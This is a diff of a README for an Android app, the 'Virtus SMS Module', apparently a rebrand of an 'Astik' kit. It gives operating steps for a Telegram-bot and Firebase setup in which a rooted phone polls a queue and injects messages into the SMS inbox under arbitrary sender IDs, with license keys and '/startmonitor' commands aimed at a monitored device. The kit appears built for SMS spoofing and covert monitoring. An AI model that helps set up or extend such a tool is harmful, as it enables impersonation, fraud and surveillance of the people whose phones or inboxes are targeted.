@@ -1,46 +1,49 @@
 # Virtus SMS Module APK
 
-Rebranded from Astik SMS Module — connects to Telegram bot via Firebase.
+Astik-style inject module — same poll + inject flow, Virtus branding.
 
-## How It Works
+## Flow (same as Astik)
 
-1. **Bot**: `/key https://your-firebase.firebaseio.com` sets license key
-2. **APK**: Enter same Firebase URL in Virtus app → START SERVICE
-3. **Bot**: `/fy <device_id>` → SIM → `/addchannel` → `/mynum` → `/startmonitor`
-4. **Channel SMS** → Firebase `messages/{device_id}/` → APK injects with same sender ID
+1. **Bot admin**: `/key generate` → user: `/key KEY-XXXX-XXXX-XXXX-XXXX`
+2. **APK (mynum phone)**: same KEY enter → **START SERVICE ON**
+3. **Bot**: `/fy <device_id>` → SIM select → `/mynum <number>` → `/addchannel` → `/startmonitor`
+4. Bot pushes inject to `{device_firebase}/messages/num-{mynum}/`
+5. APK reads config from `virtus-module-default-rtdb.../config/{KEY}.json`
+6. APK polls `{firebase_url}/messages/{device_id}` and injects sender + body into inbox
 
 ## Firebase Structure
 
 ```
-{your-firebase}/
-  virtus_config.json       ← monitoring, device_id, firebase_url
-  messages/{device_id}/    ← inject queue (sender, body, injected)
-  devices/{device_id}/     ← device heartbeat
+https://virtus-module-default-rtdb.firebaseio.com/
+  config/{KEY}.json          ← monitoring, firebase_url, device_id=num-{mynum}
+  license_keys/{KEY}/meta    ← active:true (bot-generated keys only)
+
+{device_firebase}/
+  messages/num-{mynum}/      ← inject queue {sender, body, injected}
+  devices/{device_id}/       ← monitored device heartbeat
 ```
 
-## Install APK
+## Install
 
-```bash
-# Signed APK location:
+```
 apk/virtus-sms-module.apk
 ```
 
-1. Install on rooted Android phone
+1. Install on **rooted** Android (mynum / inject phone)
 2. Grant SMS + notification permissions
-3. Enter Firebase URL (same as `/key` in bot)
+3. Enter admin-generated `KEY-XXXX-...`
 4. Toggle **START SERVICE** ON
-5. Press **TEST INJECTION** — inbox mein `BABY` se `Chacha Ji Pani Pila Do` aayega
-6. Bot `/startmonitor` par bhi same test SMS bhejta hai
+5. **TEST INJECTION** → inbox: `CHACHA` / `Chacha Ji Pani Pila Do?`
+6. Bot `/startmonitor` also injects same test via Firebase
 
 ## Requirements
 
-- Rooted phone (Magisk) for SMS injection
-- LSPosed optional (xposed_init present but MainHook not required for core flow)
-- Internet access for Firebase polling
+- Root (Magisk) for SmsInjector / SmsBroadcaster
+- Internet for Firebase SSE + poll
+- Only bot-generated keys get config published (random keys = no monitoring)
 
-## Build From Source
+## Build
 
 ```bash
-/workspace/apktool b apk/virtus_decompiled -o virtus_unsigned.apk
-jarsigner -keystore virtus.keystore virtus_unsigned.apk virtus
+cd apk && bash build-apk.sh
 ```
